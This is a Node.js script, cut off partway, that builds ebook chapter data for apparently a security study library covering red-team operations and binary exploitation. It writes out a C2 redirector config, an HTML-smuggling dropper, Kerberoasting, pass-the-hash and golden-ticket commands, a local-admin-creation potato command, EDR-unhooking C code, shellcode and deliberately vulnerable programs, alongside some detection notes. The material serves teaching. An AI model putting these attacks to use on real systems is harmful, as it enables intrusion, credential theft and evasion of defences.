const fs = require('fs');
const path = require('path');
const vm = require('vm');

const targetFilePath = path.join(__dirname, 'frontend', 'assets', 'js', 'technical-library-data.js');
const rawFile = fs.readFileSync(targetFilePath, 'utf8');

const sandbox = { window: {} };
vm.createContext(sandbox);
vm.runInContext(rawFile, sandbox);

const library = sandbox.window.PREPSPACE_LIBRARY;
if (!library || !library.books) {
  console.error('Could not load window.PREPSPACE_LIBRARY');
  process.exit(1);
}

function makeChapter(id, num, title, subtitle, summary, readingTime, contentHtml) {
  return {
    id: id,
    chapterNumber: num,
    title: title,
    subtitle: subtitle,
    summary: summary,
    readingTimeMinutes: readingTime,
    isFreePreview: num <= 2,
    sortOrder: num,
    contentHtml: contentHtml
  };
}

function codeBlock(lang, filename, code) {
  const cleanCode = code.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  return `
    <div class="book-code-block my-3">
      <div class="book-code-header d-flex justify-content-between align-items-center px-3 py-1.5 bg-dark border-bottom border-secondary border-opacity-30">
        <span class="font-monospace text-warning fs-9">${lang} — ${filename}</span>
        <button class="btn btn-xs btn-outline-secondary text-light px-2 py-0.5 fs-9" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText); showToast('Code copied to clipboard!', 'success');">Copy</button>
      </div>
      <pre class="m-0 p-3 bg-black text-light font-monospace fs-8 overflow-x-auto"><code>${cleanCode}</code></pre>
    </div>
  `;
}

// ------------------------------------------------------------------------------------------------
// BOOK 201: The Hacker Playbook 3 (Red Team Edition)
// ------------------------------------------------------------------------------------------------
const book201 = {
  id: 201,
  slug: "the-hackers-playbook-3-red-team",
  title: "The Hacker Playbook 3: Practical Guide to Penetration Testing (Red Team Edition)",
  subtitle: "Campaign Infrastructure, Weaponization, Active Directory, Lateral Movement & Evasion",
  description: "The premier red teaming tactical handbook by Peter Kim. Master enterprise threat emulation, Cobalt Strike campaign deployment, Active Directory Kerberoasting, LSASS memory dumping, pass-the-hash lateral movement, and advanced EDR evasion techniques.",
  author: "Peter Kim",
  category: "Ethical Hacking & Penetration Testing",
  subcategory: "Red Teaming & Offensive Security",
  difficulty: "ADVANCED",
  pageCount: 312,
  estimatedReadingTime: "14 Hours",
  fileSize: "8.99 MB",
  downloadUrl: "downloads/cybersecurity/the-hackers-playbook-3.pdf",
  tags: ["RedTeaming", "ActiveDirectory", "CobaltStrike", "Kerberos", "LateralMovement", "Evasion"],
  licenseType: "EDUCATIONAL REFERENCE",
  copyrightNotice: "© Peter Kim. Integrated for authorized educational reference.",
  isPro: true,
  badge: "Offensive Playbook",
  rating: 4.96,
  readerCount: 3420,
  icon: "fa-solid fa-user-secret",
  gradient: "linear-gradient(135deg, #1e1e24, #991b1b)",
  chapters: [
    makeChapter(20101, 1, "Red Team Infrastructure & C2 Architecture", "Domain Fronting, HTTPS Redirectors & Multi-Tier Command & Control",
      "Architect resilient, stealthy offensive infrastructure using cloud redirectors, DNS rotation, and encrypted C2 egress channels.", 28, `
      <h3>1.1 Modern Multi-Tier Red Team Infrastructure</h3>
      <p>A professional red team operation never exposes the central Command and Control (C2) server directly to target networks. If a single endpoint or blue team analyst detects beacon traffic, direct attribution could result in domain takedowns or IP blacklisting. Instead, operators build a resilient multi-tier topology featuring distributed reverse proxies, cloud fronting services, and disposable egress redirectors.</p>
      
      <div class="ps-panel-box p-3 my-3">
        <h5 class="text-warning fs-7"><i class="fa-solid fa-sitemap me-2"></i>Multi-Tier C2 Infrastructure Architecture</h5>
        <pre class="text-cyan font-monospace fs-8 m-0">
Target Corporate LAN
      │
      ├── HTTPS Beacon (Port 443) ──► CDN / CloudFront Edge (Domain Fronting)
      │                                       │
      │                                       ▼
      │                             Tier 1: Cloud Apache / Nginx HTTPS Redirector (Disposable VPS)
      │                                       │ (Mod_Rewrite Filter: User-Agent, URI Regex)
      │                                       ▼
      │                             Tier 2: Team Server / Cobalt Strike C2 (Hidden / Firewall-Locked)
      │
      └── DNS Tunneling Beacon ──────► Authoritative Name Server (NS Record Forwarding)
        </pre>
      </div>

      <h3>1.2 Configuring Nginx as an Intelligent Traffic Redirector</h3>
      <p>Using Nginx reverse proxies with strict header validation allows red team operators to filter out automated blue team threat scanners, Shodan crawlers, and virus submission sandboxes while exclusively forwarding legitimate operational beacons to the backend teamserver:</p>

      ${codeBlock("Nginx Conf", "/etc/nginx/sites-available/c2-redirector.conf", `
server {
    listen 443 ssl http2;
    server_name support.legitimate-cloud-portal.com;

    ssl_certificate /etc/letsencrypt/live/support.legitimate-cloud-portal.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/support.legitimate-cloud-portal.com/privkey.pem;

    # Filter by specific malleable C2 User-Agent and URI pattern
    location ~ ^/api/v2/(session|heartbeat|sync) {
        if ($http_user_agent != "Mozilla/5.0 (Windows NT 10.0; Win64; x64; CustomClient/3.1)") {
            return 302 https://www.google.com;
        }
        proxy_pass https://10.0.0.50:443;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }

    # All unexpected scanners get decoy benign documentation page
    location / {
        proxy_pass https://www.wikipedia.org;
    }
}`)}

      <h3>1.3 Blue Team Detection Traps & Egress Monitoring</h3>
      <p>Modern Security Operations Centers (SOCs) detect beaconing through statistical analysis of outbound network jitter, TLS Certificate Issuer anomaly checks, and high-frequency JA3/JA3S fingerprint signatures. Operators must configure malleable C2 profiles with randomized polling intervals (jitter $\\ge$ 35%) and simulate legitimate internal SaaS software profiles (e.g. Office 365 telemetry or Slack WebSockets).</p>
    `),
    makeChapter(20102, 2, "Reconnaissance & External Attack Surface Discovery", "OSINT Frameworks, Certificate Transparency & Cloud Asset Enumeration",
      "Execute automated reconnaissance to discover shadow IT, exposed development APIs, and corporate email topologies.", 26, `
      <h3>2.1 Passive Open Source Intelligence (OSINT)</h3>
      <p>Passive reconnaissance gathers operational intelligence without transmitting a single packet directly to the target organization's owned IP space. By querying public database aggregators, certificate transparency logs, and code repositories, operators identify exposed endpoints and authentication surfaces.</p>

      <h3>2.2 Certificate Transparency (CT) Log Ingestion</h3>
      <p>Whenever an enterprise issues a new SSL/TLS certificate for a subdomain (e.g. <code>vpn-dev.target.corp</code> or <code>sso-test.target.com</code>), the Certificate Authority must publicly log the transaction in append-only CT logs. Querying these public logs via crt.sh or Python yields hidden internal hostnames:</p>

      ${codeBlock("Python 3", "ct_recon.py", `
import requests
import json

def fetch_subdomains(target_domain):
    url = f"https://crt.sh/?q=%.{target_domain}&output=json"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    subdomains = set()

    try:
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            entries = response.json()
            for entry in entries:
                name_value = entry.get('name_value', '')
                for sub in name_value.split('\\n'):
                    if not '*' in sub:
                        subdomains.add(sub.strip().lower())
        print(f"[+] Discovered {len(subdomains)} unique subdomains for {target_domain}:")
        for sub in sorted(subdomains):
            print(f"  - {sub}")
    except Exception as e:
        print(f"[-] Error querying CT logs: {e}")

if __name__ == "__main__":
    fetch_subdomains("example.com")`)}

      <h3>2.3 Enumerating Cloud Buckets & Exposed Secrets</h3>
      <p>Red team operators search for unsecured Amazon S3 buckets, Azure Blob Storage containers, and Google Cloud Storage buckets named with corporate permutations (e.g. <code>target-corp-backup</code>, <code>target-dev-assets</code>). Unauthenticated read/write permissions on these buckets frequently expose source code, SQL database backups, and AWS API IAM credentials.</p>
    `),
    makeChapter(20103, 3, "Initial Access & Payload Weaponization", "HTML Smuggling, Malleable C2 Payloads & LNK Obfuscation",
      "Craft modern evasive payloads that bypass perimeter email gateways and deliver initial interactive access.", 30, `
      <h3>3.1 The Evolution of Initial Access Payloads</h3>
      <p>Legacy macros (.docm, .xlsm) are blocked by default by Microsoft Office Mark-of-the-Web (MOTW) security controls. Modern initial compromise campaigns utilize containerized file delivery, including ISO disk images, VHD virtual hard disks, password-protected archives with HTML smuggling, and shortcut files (.LNK) invoking signed system binaries (Living Off the Land Binaries — LOLBins).</p>

      <h3>3.2 HTML Smuggling Mechanics</h3>
      <p>HTML Smuggling constructs malicious payload binaries dynamically on the client side inside the user's browser using JavaScript Blobs and Data URLs, bypassing intermediate network intrusion detection systems (NIDS) that inspect transit file bytes:</p>

      ${codeBlock("HTML / JS", "payload_delivery.html", `
<!DOCTYPE html>
<html>
<head><title>Corporate Secure Document Portal</title></head>
<body>
  <h2>Encrypted Document Viewer</h2>
  <p>Your secure document is decrypting. Please open the downloaded package to verify.</p>
  <script>
    // Base64 encoded payload binary / ISO container
    const b64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA=";
    
    function base64ToUint8Array(base64) {
      const binaryString = window.atob(base64);
      const len = binaryString.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      return bytes;
    }

    const fileBytes = base64ToUint8Array(b64Payload);
    const blob = new Blob([fileBytes], { type: "application/octet-stream" });
    const downloadLink = document.createElement("a");
    downloadLink.href = window.URL.createObjectURL(blob);
    downloadLink.download = "Corporate_Financial_Review_Q4.iso";
    document.body.appendChild(downloadLink);
    downloadLink.click();
    document.body.removeChild(downloadLink);
  </script>
</body>
</html>`)}

      <h3>3.3 Defensive Detection of HTML Smuggling</h3>
      <p>Enterprise defenders detect HTML smuggling by monitoring browser process behavior (e.g. <code>chrome.exe</code> or <code>msedge.exe</code> spawning <code>powershell.exe</code>, <code>cmd.exe</code>, or writing executable binaries directly to <code>%TEMP%</code> or <code>%APPDATA%</code>).</p>
    `),
    makeChapter(20104, 4, "Active Directory Exploitation & Kerberos Attacks", "BloodHound Graph Analysis, Kerberoasting, AS-REP Roasting & DCSync",
      "Deconstruct Windows Active Directory domain trust topologies, request vulnerable service tickets, and dump NTDS.dit password hashes.", 32, `
      <h3>4.1 Active Directory Architecture & Kerberos Protocol</h3>
      <p>Active Directory (AD) manages authentication, authorization, and group policies across enterprise Windows networks. Kerberos is the primary authentication mechanism, relying on Ticket Granting Tickets (TGTs) and Service Tickets (TGS) issued by the Key Distribution Center (KDC) running on Domain Controllers (DCs).</p>

      <div class="ps-panel-box p-3 my-3">
        <h5 class="text-warning fs-7"><i class="fa-solid fa-key me-2"></i>Kerberos 3-Legged Ticket Exchange</h5>
        <ol class="fs-8 text-light mb-0">
          <li><strong>AS-REQ / AS-REP:</strong> Client authenticates to KDC using password timestamp hash. KDC returns TGT encrypted with <code>krbtgt</code> key.</li>
          <li><strong>TGS-REQ / TGS-REP:</strong> Client presents TGT to request a service ticket for a Service Principal Name (SPN). KDC encrypts ticket using the target service account's password hash.</li>
          <li><strong>AP-REQ:</strong> Client delivers TGS to target service (e.g. MSSQL Server) for validation.</li>
        </ol>
      </div>

      <h3>4.2 Kerberoasting Mechanics & Hash Cracking</h3>
      <p>Any authenticated domain user can request a TGS ticket for any service account configured with a Service Principal Name (SPN). Because the ticket is encrypted using the service account's NTLM hash, an attacker can extract the ciphertext offline and perform dictionary attacks using Hashcat:</p>

      ${codeBlock("PowerShell / Impacket", "kerberoast_commands.sh", `
# Request SPN tickets in PowerShell via PowerView
GetUserSPNs.py -request -dc-ip 10.10.10.1 target.corp/lowpriv_user:Password123 -outputfile kerberoast_hashes.txt

# Crack extracted Kerberos 5 TGS (krb5tgs / Hashcat mode 13100)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`)}

      <h3>4.3 Active Directory BloodHound Graph Analysis</h3>
      <p>BloodHound uses graph theory to reveal unintended access control paths in Active Directory (e.g. <code>User A -> MemberOf -> HelpDesk -> GenericAll -> Domain Admins</code>). Operators run the SharpHound collector binary and analyze shortest paths to Domain Admin (DA).</p>
    `),
    makeChapter(20105, 5, "Local Privilege Escalation & Token Impersonation", "SeImpersonatePrivilege, Named Pipe Potato Exploits & DLL Sideloading",
      "Escalate from low-privilege service accounts to NT AUTHORITY\\SYSTEM using token manipulation, rogue named pipes, and unquoted paths.", 28, `
      <h3>5.1 Windows Access Tokens & Security Identifiers</h3>
      <p>Every running process on Windows inherits an Access Token representing the user's Security Identifier (SID), group memberships, and explicit privileges (e.g. <code>SeDebugPrivilege</code>, <code>SeImpersonatePrivilege</code>, <code>SeBackupPrivilege</code>).</p>

      <h3>5.2 Potato Family Token Impersonation (JuicyPotato / GodPotato)</h3>
      <p>When an attacker compromises a service account (such as IIS AppPool or SQL Server Service), the account frequently holds <code>SeImpersonatePrivilege</code>. Potato exploits force high-privileged local system components (DCOM / RPC / WinRM) to authenticate to a rogue local named pipe listener, intercepting the token and spawning a SYSTEM shell:</p>

      ${codeBlock("PowerShell / CMD", "priv_esc_potato.cmd", `
# Check assigned user privileges
whoami /priv

# If SeImpersonatePrivilege is Enabled, execute GodPotato
GodPotato-NET4.exe -cmd "cmd.exe /c net user hacker Pass@123456 /add && net localgroup administrators hacker /add"

# Verify new local administrator creation
net localgroup administrators`)}

      <h3>5.3 Unquoted Service Paths & DLL Sideloading</h3>
      <p>If a service executable path contains spaces and lacks enclosing quotes (e.g. <code>C:\\Program Files\\Custom App\\service.exe</code>), Windows evaluates paths in order of precedence: <code>C:\\Program.exe</code>, <code>C:\\Program Files\\Custom.exe</code>. Placing a malicious binary in those folders escalates privilege upon service reboot.</p>
    `),
    makeChapter(20106, 6, "Lateral Movement & Remote Code Execution", "Pass-The-Hash, Overpass-The-Hash, WMI & DCOM Execution",
      "Pivot across internal enterprise networks without triggering IDS alerts by leveraging native administrative protocols.", 30, `
      <h3>6.1 Pass-The-Hash (PtH) Architecture</h3>
      <p>NTLM authentication does not require the plaintext password. Because the NTLM hash itself is used as the cryptographic key during challenge-response authentication, capturing an NTLM hash from local memory (LSASS) permits remote login across any machine sharing that local administrator password:</p>

      ${codeBlock("Bash / Python", "pth_lateral_movement.sh", `
# Pass-The-Hash using Impacket wmiexec
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c Administrator@10.10.10.25 "whoami"

# Pass-The-Hash via SMB (psexec)
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c target.corp/admin_user@10.10.10.30`)}

      <h3>6.2 Lateral Movement via WinRM & PowerShell Remoting</h3>
      <p>Windows Remote Management (WinRM on port 5985/5986) is enabled across many modern corporate environments for centralized systems management. Attackers use <code>Evil-WinRM</code> or PowerShell sessions for interactive command execution with zero binary drops to disk.</p>
    `),
    makeChapter(20107, 7, "Persistence & Domain Dominance", "Golden Tickets, Silver Tickets, Skeleton Key & DCShadow",
      "Establish permanent, stealthy domain backdoors that survive enterprise password resets and administrative audits.", 28, `
      <h3>7.1 Forging Golden Tickets (Kerberos TGT)</h3>
      <p>Once an operator obtains Domain Admin privileges and extracts the password hash of the Active Directory <code>krbtgt</code> account, they can forge a Ticket Granting Ticket (TGT) valid for any user (e.g. fake user or built-in Administrator) with full Enterprise Admin privileges. This Golden Ticket remains valid even if domain users change their individual passwords.</p>

      ${codeBlock("Mimikatz", "forge_golden_ticket.cmd", `
# Step 1: Dump KRBTGT NTLM Hash from Domain Controller using DCSync
mimikatz # lsadump::dcsync /domain:target.corp /user:krbtgt

# Step 2: Forge Golden Ticket with 10-year validity
mimikatz # kerberos::golden /domain:target.corp /sid:S-1-5-21-123456789-987654321-11223344 /krbtgt:b2d07525f20f068c22780e1b6f0e34c9 /user:StealthAdmin /groups:512,513,518,519,520 /ptt

# Step 3: Access Domain Controller C$ Share directly
dir \\\\DC01.target.corp\\c$`)}

      <h3>7.2 Remediation: The Dual KRBTGT Password Reset</h3>
      <p>Because Active Directory retains history for the previous <code>krbtgt</code> password to allow in-flight tickets to expire cleanly, remediating a Golden Ticket breach requires resetting the <code>krbtgt</code> password twice, separated by a 24-hour replication cycle.</p>
    `),
    makeChapter(20108, 8, "Defense Evasion & EDR Unhooking", "AMSI Bypassing, Process Hollowing, Direct Syscalls & ntdll Unhooking",
      "Bypass modern Endpoint Detection and Response (EDR) solutions by evading user-mode API hooking and runtime memory inspection.", 34, `
      <h3>8.1 EDR User-Mode Hooking Mechanisms</h3>
      <p>Endpoint Detection and Response (EDR) agents inject a monitoring dynamic link library (e.g. <code>edr_sensor.dll</code>) into every user-mode process. This library overwrites the entry points of critical Windows native APIs in <code>ntdll.dll</code> (such as <code>NtAllocateVirtualMemory</code>, <code>NtWriteVirtualMemory</code>, <code>NtCreateThreadEx</code>) with a <code>JMP</code> instruction redirecting execution to the EDR inspection engine.</p>

      <h3>8.2 Restoring Clean ntdll via In-Memory Unhooking</h3>
      <p>Red team payloads bypass EDR hooks by reading the clean, original <code>.text</code> machine code section directly from the disk image of <code>ntdll.dll</code> and overwriting the in-memory hooked bytes:</p>

      ${codeBlock("C / C++", "unhook_ntdll.c", `
#include <windows.h>
#include <stdio.h>

void UnhookNtdll() {
    HANDLE hProcess = GetCurrentProcess();
    MODULEINFO mi = { 0 };
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(hProcess, hNtdll, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    // Map clean ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllMapping;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllMapping + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
        if (strcmp((char*)section->Name, ".text") == 0) {
            DWORD oldProtect = 0;
            LPVOID targetAddr = (LPVOID)((DWORD_PTR)ntdllBase + section->VirtualAddress);
            LPVOID sourceAddr = (LPVOID)((DWORD_PTR)ntdllMapping + section->VirtualAddress);
            
            // Restore original memory permissions and copy clean text bytes
            VirtualProtect(targetAddr, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(targetAddr, sourceAddr, section->Misc.VirtualSize);
            VirtualProtect(targetAddr, section->Misc.VirtualSize, oldProtect, &oldProtect);
            printf("[+] Successfully restored clean ntdll .text section - EDR hooks removed!\\n");
            break;
        }
    }
    CloseHandle(hMapping);
    CloseHandle(hFile);
}`)}

      <h3>8.3 Direct Syscalls & Hell's Gate / Halo's Gate</h3>
      <p>Rather than calling <code>ntdll.dll</code> functions that might contain user-mode hooks, advanced payloads implement assembly stubs that dynamically resolve the System Service Number (SSN) and invoke the kernel directly using the <code>syscall</code> instruction.</p>
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// BOOK 202: Hacking: The Art of Exploitation (Jon Erickson)
// ------------------------------------------------------------------------------------------------
const book202 = {
  id: 202,
  slug: "hacking-the-art-of-exploitation-2nd",
  title: "Hacking: The Art of Exploitation (2nd Edition)",
  subtitle: "C Systems Architecture, Assembly, Stack Overflows, Shellcode & GDB Internals",
  description: "The seminal foundational security text by Jon Erickson. Explores the core mechanics of Von Neumann architectures, C pointer arithmetic, memory corruption vulnerabilities, x86/x64 assembly language, stack buffer overflows, format strings, and cryptographic mathematics.",
  author: "Jon Erickson",
  category: "Ethical Hacking & Penetration Testing",
  subcategory: "Binary Exploitation & Memory Safety",
  difficulty: "ADVANCED",
  pageCount: 488,
  estimatedReadingTime: "18 Hours",
  fileSize: "5.68 MB",
  downloadUrl: "downloads/cybersecurity/hacking-art-of-exploitation.pdf",
  tags: ["Exploitation", "BufferOverflow", "C", "Shellcode", "Assembly", "GDB", "MemoryCorruption"],
  licenseType: "EDUCATIONAL REFERENCE",
  copyrightNotice: "© Jon Erickson / No Starch Press. Integrated for authorized educational reference.",
  isPro: false,
  badge: "Classic Masterwork",
  rating: 4.97,
  readerCount: 3950,
  icon: "fa-solid fa-microchip",
  gradient: "linear-gradient(135deg, #1e1e24, #64748b)",
  chapters: [
    makeChapter(20201, 1, "Low-Level C Programming & Memory Layout", "Virtual Memory Segments (Text, Data, BSS, Heap, Stack) & Pointer Arithmetic",
      "Understand the low-level virtual memory mapping of running C programs, memory segment boundaries, and pointer arithmetic.", 26, `
      <h3>1.1 Virtual Memory Mapping in Von Neumann Architecture</h3>
      <p>In standard 32-bit and 64-bit operating systems, every running program executes inside an isolated virtual address space created by the operating system's Memory Management Unit (MMU). This memory space is structured into distinct functional segments:</p>

      <div class="ps-panel-box p-3 my-3">
        <h5 class="text-warning fs-7"><i class="fa-solid fa-memory me-2"></i>Process Virtual Address Space (x86 Architecture)</h5>
        <pre class="text-cyan font-monospace fs-8 m-0">
High Memory (0xFFFFFFFF)  ┌────────────────────────────────────────┐
                          │ Environment Variables & Arguments      │
                          ├────────────────────────────────────────┤
                          │ STACK (Grows Downward  ▼)              │
                          │   [Function Frames, Local Vars, EIP]   │
                          ├────────────────────────────────────────┤
                          │                ▼    ▲                  │
                          │                │    │ (Free Memory)    │
                          ├────────────────────────────────────────┤
                          │ HEAP (Grows Upward  ▲)                 │
                          │   [malloc(), calloc(), dynamic buffers]│
                          ├────────────────────────────────────────┤
                          │ BSS Segment (Uninitialized Globals)    │
                          ├────────────────────────────────────────┤
                          │ DATA Segment (Initialized Globals)     │
                          ├────────────────────────────────────────┤
Low Memory  (0x08048000)  │ TEXT Segment (Read-Only Machine Code)  │
                          └────────────────────────────────────────┘
        </pre>
      </div>

      <h3>1.2 Pointer Arithmetic & Memory Addressing in C</h3>
      <p>Pointers are variables that store physical or virtual memory addresses. Performing pointer arithmetic shifts the memory offset by the byte size of the referenced data type (e.g. adding 1 to a <code>int*</code> shifts address by 4 bytes on x86):</p>

      ${codeBlock("C", "pointer_arithmetic.c", `
#include <stdio.h>

int main() {
    int arr[5] = {10, 20, 30, 40, 50};
    int *ptr = arr; // Points to arr[0]

    printf("Base Address (arr[0]): %p | Value: %d\\n", (void*)ptr, *ptr);
    ptr++; // Advance by sizeof(int) = 4 bytes
    printf("Next Address (arr[1]): %p | Value: %d\\n", (void*)ptr, *ptr);

    // Memory traversal via byte casting
    unsigned char *byte_ptr = (unsigned char*)arr;
    printf("Raw first byte in little-endian: 0x%02x\\n", *byte_ptr);
    return 0;
}`)}
    `),
    makeChapter(20202, 2, "Disassembly, CPU Registers & GDB Internals", "x86 Registers (EAX, ESP, EBP, EIP), Assembly Opcodes & GDB Commands",
      "Master the GNU Debugger (GDB) for inspecting CPU state, stepping through instructions, and analyzing stack frame construction.", 28, `
      <h3>2.1 CPU Registers & Function Call Frames</h3>
      <p>During program execution, the central processing unit (CPU) relies on high-speed internal storage locations called registers to execute instructions and maintain function state:</p>
      
      <ul>
        <li><code>EIP (Instruction Pointer):</code> Stores the memory address of the next machine instruction to be executed by the CPU.</li>
        <li><code>ESP (Stack Pointer):</code> Points to the current top of the active execution stack.</li>
        <li><code>EBP (Base / Frame Pointer):</code> Points to the base of the current local function frame, anchoring local variables (<code>[EBP - 4]</code>) and parameters (<code>[EBP + 8]</code>).</li>
        <li><code>EAX / EBX / ECX / EDX:</code> General-purpose registers for arithmetic operations, loop counters, and system call numbers.</li>
      </ul>

      <h3>2.2 Function Call Prologue and Epilogue</h3>
      <p>When a function is called in C, the compiler generates a standardized prologue and epilogue to manage the stack frame:</p>

      ${codeBlock("x86 Assembly", "function_stack_frame.s", `
; Function Prologue
push ebp             ; Save caller's base pointer
mov ebp, esp         ; Set new base pointer for current function
sub esp, 0x20        ; Allocate 32 bytes on the stack for local variables

; Function Body
mov DWORD PTR [ebp-4], 0x41424344 ; Store local variable

; Function Epilogue
mov esp, ebp         ; Deallocate local variables
pop ebp              ; Restore caller's base pointer
ret                  ; Pop saved return address into EIP and return`)}

      <h3>2.3 Essential GDB Debugging Commands for Vulnerability Analysis</h3>
      <div class="table-responsive">
        <table class="table table-dark table-bordered table-striped fs-8">
          <thead><tr><th>Command</th><th>Purpose</th><th>Example</th></tr></thead>
          <tbody>
            <tr><td><code>disassemble &lt;func&gt;</code></td><td>View compiled assembly instructions of function</td><td><code>disas main</code></td></tr>
            <tr><td><code>x/wx &lt;addr&gt;</code></td><td>Examine 1 word (4 bytes) in hexadecimal format</td><td><code>x/16wx $esp</code></td></tr>
            <tr><td><code>x/s &lt;addr&gt;</code></td><td>Examine memory as ASCII string</td><td><code>x/s 0x08048500</code></td></tr>
            <tr><td><code>info registers</code></td><td>Print values of all CPU registers</td><td><code>i r</code></td></tr>
            <tr><td><code>break *&lt;addr&gt;</code></td><td>Set execution breakpoint at exact memory address</td><td><code>b *0x0804845a</code></td></tr>
          </tbody>
        </table>
      </div>
    `),
    makeChapter(20203, 3, "Stack-Based Buffer Overflows & EIP Hijacking", "Unsafe C Functions (strcpy, gets), Off-By-One & Return Address Overwriting",
      "Explore how unbounded buffer copies overwrite adjacent memory, hijack the stored EIP return address, and redirect execution flow.", 32, `
      <h3>3.1 Anatomy of a Stack Buffer Overflow</h3>
      <p>A buffer overflow occurs when a program writes more data into a fixed-size buffer on the stack than the allocated boundary allows. Because C does not automatically enforce array bounds checking, unsafe functions like <code>strcpy()</code>, <code>gets()</code>, and <code>sprintf()</code> copy bytes continuously until they encounter a null byte (<code>0x00</code>).</p>

      ${codeBlock("C", "vulnerable_overflow.c", `
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *user_input) {
    char local_buffer[64]; // Fixed stack buffer of 64 bytes
    
    // VULNERABILITY: strcpy does not check if user_input exceeds 64 bytes!
    strcpy(local_buffer, user_input);
    printf("Buffer contains: %s\\n", local_buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    } else {
        printf("Usage: %s <input_string>\\n", argv[0]);
    }
    return 0;
}`)}

      <h3>3.2 Controlling the Instruction Pointer (EIP)</h3>
      <p>When input greater than 64 bytes is provided, excess bytes overwrite the saved frame pointer (EBP) and then the saved return address (EIP). By setting the saved return address to the memory location of injected shellcode, the attacker hijacks program execution.</p>

      <div class="ps-panel-box p-3 my-3">
        <h5 class="text-warning fs-7"><i class="fa-solid fa-layer-group me-2"></i>Overflow Memory Layout</h5>
        <pre class="text-cyan font-monospace fs-8 m-0">
[ 64-byte local_buffer ] + [ 4-byte Saved EBP ] + [ 4-byte Saved Return EIP ]
       "A" * 64          +       "B" * 4        +     0x08048450 (Target Address)
        </pre>
      </div>
    `),
    makeChapter(20204, 4, "Writing Position-Independent Shellcode", "x86 Assembly, Null-Free Machine Code, NOP Sleds & Syscall Execution",
      "Write compact, position-independent machine code (shellcode) to spawn root shells (`/bin/sh`) without containing terminating null bytes (`\\x00`).", 30, `
      <h3>4.1 Eliminating Null Bytes in Shellcode</h3>
      <p>Because C string manipulation functions treat <code>0x00</code> as an end-of-string terminator, any shellcode containing null bytes will be cut short during copy. Assembly programmers use bitwise operations (like <code>xor eax, eax</code> instead of <code>mov eax, 0</code>) to generate null-free binary opcodes.</p>

      ${codeBlock("x86 Assembly (NASM)", "execve_shellcode.asm", `
; Null-Free x86 execve("/bin//sh", NULL, NULL) Shellcode
section .text
global _start

_start:
    xor eax, eax        ; Zero out EAX register (eax = 0)
    push eax            ; Push null terminator onto stack for string
    push 0x68732f2f     ; Push '//sh' in reverse order (little-endian)
    push 0x6e69622f     ; Push '/bin' in reverse order
    mov ebx, esp        ; EBX points to string "/bin//sh" (1st arg)
    
    xor ecx, ecx        ; ECX = NULL (argv = NULL)
    xor edx, edx        ; EDX = NULL (envp = NULL)
    mov al, 11          ; EAX = 11 (sys_execve system call number)
    int 0x80            ; Trigger kernel interrupt to execute syscall`)}

      <h3>4.2 The NOP Sled (0x90 Slide)</h3>
      <p>In real-world memory layouts where the exact stack address might vary by a few bytes, attackers prepend a sequence of <code>NOP</code> instructions (opcode <code>0x90</code>) before the shellcode. As long as EIP jumps anywhere within this NOP sled, the CPU slides smoothly until it hits the payload.</p>
    `),
    makeChapter(20205, 5, "Format String Vulnerabilities & Arbitrary Writes", "Direct Parameter Access (%x, %s, %n) & Global Offset Table (GOT) Overwrites",
      "Manipulate printf format specifiers to read arbitrary memory and write memory addresses using the %n format token.", 28, `
      <h3>5.1 Mechanics of Format String Flaws</h3>
      <p>When a developer passes user input directly to <code>printf(user_input)</code> instead of using a format specifier like <code>printf("%s", user_input)</code>, the format engine parses user-controlled tokens (<code>%x</code>, <code>%s</code>, <code>%n</code>) directly off the stack.</p>

      ${codeBlock("C", "format_string_vuln.c", `
#include <stdio.h>

int main(int argc, char *argv[]) {
    int target_secret = 0x1337BEEF;
    if (argc > 1) {
        // VULNERABILITY: User input evaluated as format specifier!
        printf(argv[1]);
        printf("\\n");
    }
    return 0;
}`)}

      <h3>5.2 Arbitrary Memory Writes with %n</h3>
      <p>The <code>%n</code> specifier writes the total count of characters printed so far into the memory address supplied on the stack. By combining width specifiers (e.g. <code>%1337x%4$n</code>), attackers overwrite function pointers in the Global Offset Table (GOT) to redirect program flow.</p>
    `),
